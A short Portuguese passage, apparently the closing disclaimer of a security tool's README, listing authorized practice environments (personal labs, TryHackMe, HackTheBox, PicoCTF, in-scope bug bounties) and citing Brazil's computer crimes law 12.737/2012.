  • Seu laboratório pessoal (VMs, Metasploitable, DVWA)
  • Plataformas autorizadas (TryHackMe, HackTheBox, PicoCTF)
  • Programas de Bug Bounty dentro do escopo definido

Lei nº 12.737/2012 — Delitos Informáticos — Brasil
github.com/felipeds-cdc
```
